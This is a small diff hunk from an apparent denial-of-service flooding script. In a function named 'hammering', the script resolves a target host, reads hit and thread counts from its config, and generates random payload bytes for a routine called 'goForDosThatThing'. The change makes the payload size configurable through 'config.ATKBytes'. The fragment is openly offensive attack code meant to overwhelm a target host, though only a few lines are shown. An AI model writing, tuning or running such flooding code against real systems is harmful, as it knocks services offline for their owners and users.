@@ -35,7 +35,7 @@ def hammering():
     speedPerRun = config.Hammer_PARAMETERS["hits"]
     threads = config.Hammer_PARAMETERS["threads"]
     ip = socket.gethostbyname(host)
-    bytesToSend = random._urandom(2450)
+    bytesToSend = random._urandom(config.ATKBytes)
 
     def goForDosThatThing():
         try:
